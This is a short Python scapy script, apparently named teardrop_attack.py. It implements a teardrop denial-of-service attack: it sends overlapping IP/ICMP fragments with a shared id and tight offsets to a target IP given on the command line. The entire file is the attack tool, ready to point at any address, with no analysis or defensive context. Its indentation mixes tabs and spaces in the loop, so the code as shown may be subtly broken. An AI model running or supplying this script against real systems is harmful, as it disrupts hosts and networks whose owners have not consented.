#!/usr/bin/env python3

from scapy.all import *
import sys

# function to create fragmented packets
def attack(target_ip):
	size = 1000
	offset = 0
	data = b"\x00" * size
    
    # payload for fragmented packets
	patterns = [b"\xAA" * size, b"\xBB" * size, b"\xCC" * size, b"\xDD" * size,
            	b"\xEE" * size, b"\xFF" * size, b"\x11" * size, b"\x22" * size]

	packets = []
	for i in range(8):
    	frag_payload = patterns[i][offset:]
    	frag = IP(dst=target_ip, id=12345, frag=offset * 8, flags="MF") / ICMP() / frag_payload
    	packets.append(frag)
    	offset += 1

	# Sending the last fragment with the "MF" flag unset
	last_frag_payload = patterns[7][offset:]
	last_frag = IP(dst=target_ip, id=12345, frag=offset * 8) / ICMP() / last_frag_payload
	packets.append(last_frag)

	send(packets)


if __name__ == "__main__":
	if len(sys.argv) != 2:
    	print("Usage: python3 teardrop_attack.py <target_ip>")
    	sys.exit(1)

	target_ip = sys.argv[1]
	attack(target_ip)
